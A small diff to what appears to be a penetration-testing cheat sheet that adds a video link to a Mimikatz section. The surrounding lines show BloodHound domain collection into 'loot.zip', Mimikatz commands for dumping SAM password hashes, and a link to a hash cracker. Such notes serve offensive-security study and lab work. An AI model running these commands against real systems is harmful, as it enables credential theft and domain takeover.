@@ -241,8 +241,9 @@ on victim, transfer file then import into Bloodhound and run queries
     Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
     
 ## Mimikatz  
-[Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/) 
-[Online Password Cracker - Crackstation](https://crackstation.net/)   
+[Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)    
+[Online Password Cracker - Crackstation](https://crackstation.net/)     
+[Dumping Hashes with Mimikatz - Video](https://www.youtube.com/watch?v=AZirvtZNIEw)   
 
     privilege::debug
     lsadump::sam
